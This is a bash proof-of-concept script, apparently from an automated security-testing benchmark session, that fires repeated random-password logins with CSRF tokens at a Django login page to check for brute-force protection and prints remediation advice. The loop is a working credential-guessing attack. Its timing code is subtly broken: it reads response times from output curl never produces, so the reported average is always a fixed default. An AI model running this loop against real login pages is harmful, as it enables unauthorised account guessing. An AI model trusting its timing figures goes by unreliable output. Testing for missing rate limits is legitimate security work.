#!/bin/bash
# POC: Demonstrates missing brute force protection on login endpoint
# Target: ./repo
# Created: 2025-11-04T17:17:08.432Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# Login Brute Force Protection POC
# Tests login endpoint for brute force protection

# Configuration
LOGIN_URL="http://example.com/accounts/login/"
USERNAME="testuser"
LOGIN_ATTEMPTS=10
SUCCESS_COUNT=0
NO_RATE_LIMIT_COUNT=0
ERROR_COUNT=0
RESPONSE_TIME_SUM=0

echo "Testing login endpoint for brute force protection: $LOGIN_URL"
echo "Username: $USERNAME"
echo "Attempting $LOGIN_ATTEMPTS login attempts..."

# Function to perform a login attempt
attempt_login() {
  local attempt_number=$1
  echo "Attempt #$attempt_number"
  
  # Generate random password for each attempt
  local password=$(openssl rand -base64 12)
  
  # Get the CSRF token
  local csrf_cookie=$(curl -s -I "$LOGIN_URL" | grep 'csrftoken=' | sed 's/.*csrftoken=\([^;]*\).*/\1/')
  
  # Send the login request
  response=$(curl -s -D - \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: csrftoken=$csrf_cookie" \
    -X POST \
    -d "username=$USERNAME&password=$password&csrfmiddlewaretoken=$csrf_cookie" \
    "$LOGIN_URL")
  
  # Calculate response time
  local response_time=$(echo "$response" | grep "took" | awk '{print $2}')
  
  # Check response status
  local status_code=$(echo "$response" | head -n 1 | cut -d ' ' -f 2)
  
  # Check for rate limiting indicators (429, 403, etc.)
  if [[ "$status_code" == "200" ]]; then
    ((SUCCESS_COUNT++))
    echo "  - Status: $status_code (Success - Failed Login)"
  elif [[ "$status_code" == "429" || "$status_code" == "403" ]]; then
    echo "  - Status: $status_code (Rate Limiting/Account Locked)"
  elif [[ "$status_code" == "302" ]]; then
    echo "  - Status: $status_code (Possible Successful Login - UNEXPECTED)"
  else
    echo "  - Status: $status_code (Other Response)"
    ((ERROR_COUNT++))
  fi
  
  # Add the response time to the sum
  if [[ "$response_time" =~ ^[0-9]+$ ]]; then
    RESPONSE_TIME_SUM=$((RESPONSE_TIME_SUM + response_time))
  else
    # If curl didn't return a response time, use a default
    RESPONSE_TIME_SUM=$((RESPONSE_TIME_SUM + 1000))
  fi
  
  # Check if response includes standard Django error page
  if echo "$response" | grep -q "Django"; then
    echo "  - Django Debug Information Detected"
  fi
  
  # Sleep briefly to prevent overwhelming the server
  sleep 0.5
}

# Main execution
for ((i=1; i<=LOGIN_ATTEMPTS; i++)); do
  attempt_login $i
done

# Calculate average response time
RESPONSE_TIME_AVG=$((RESPONSE_TIME_SUM / LOGIN_ATTEMPTS))

# Print summary
echo
echo "===== Summary ====="
echo "Total Attempts: $LOGIN_ATTEMPTS"
echo "Successful HTTP 200 Responses: $SUCCESS_COUNT"
echo "Average Response Time: ${RESPONSE_TIME_AVG}ms"

# Determine findings
echo
echo "Findings:"
if [[ "$SUCCESS_COUNT" == "$LOGIN_ATTEMPTS" ]]; then
  echo "- VULNERABILITY: All $LOGIN_ATTEMPTS attempts were successful (HTTP 200) with no rate limiting"
  NO_RATE_LIMIT_COUNT=$LOGIN_ATTEMPTS
else
  echo "- Some form of rate limiting or blocking appears to be in place"
fi

if [[ "$ERROR_COUNT" -gt 0 ]]; then
  echo "- Server encountered errors on $ERROR_COUNT attempts"
fi

# Suggest remediation
echo
echo "Recommended Actions:"
if [[ "$NO_RATE_LIMIT_COUNT" -ge 5 ]]; then
  echo "- Implement rate limiting to prevent brute force attacks"
  echo "- Add account lockout mechanisms"
  echo "- Consider adding CAPTCHA after multiple failed attempts"
fi
if [[ "$RESPONSE_TIME_AVG" -lt 10 ]]; then
  echo "- Consider adding progressive delays to slow down repeated attempts"
fi

# Exit with appropriate code
if [[ "$NO_RATE_LIMIT_COUNT" -ge 5 ]]; then
  exit 1  # Found vulnerability
else
  exit 0  # No significant vulnerability found
fi